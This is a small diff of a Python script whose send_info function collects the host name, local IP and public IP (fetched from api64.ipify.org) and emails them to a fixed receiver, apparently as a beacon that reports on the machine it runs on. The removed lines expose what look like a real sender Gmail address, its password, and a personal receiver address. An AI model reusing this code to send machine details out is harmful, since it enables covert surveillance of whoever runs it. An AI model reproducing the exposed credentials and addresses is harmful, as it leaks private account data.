@@ -9,13 +9,13 @@ def send_info():
 
     public = requests.get('https://api64.ipify.org').text
 
-    email = 'btctestermigo@gmail.com'
-    password = 'migo2003'
+    email = 'email' # Sender email
+    password = 'passwd' # Sender password
 
     msg = EmailMessage()
     msg['Subject'] = f'info of {public}'
     msg['from'] = email
-    msg['to'] = 'michael20030617knepper@gmail.com'
+    msg['to'] = 'email' # Receiver email
     msg.set_content(f'''
     Host Name >>>> {h_name}
     Local IP  >>>> {local}
